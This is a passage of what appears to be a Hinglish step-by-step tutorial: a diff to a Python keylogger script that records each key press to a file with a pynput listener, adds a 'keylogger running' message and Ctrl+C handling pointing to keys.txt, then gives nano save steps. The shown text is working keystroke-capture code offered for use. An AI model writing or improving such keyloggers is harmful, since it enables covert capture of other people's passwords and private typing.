@@ -1536,8 +1536,13 @@ def on_press(key):
         with open(log_file, "a") as f:
             f.write(f"[{key}]")
 
-with Listener(on_press=on_press) as listener:
-    listener.join()
+print("Keylogger chalu hai... band karne ke liye Ctrl+C dabaao")
+
+try:
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+except KeyboardInterrupt:
+    print("\nKeylogger band ho gaya. keys.txt check karo.")
 ```
 
 Save karo: `Ctrl + X` → `Y` → `Enter`
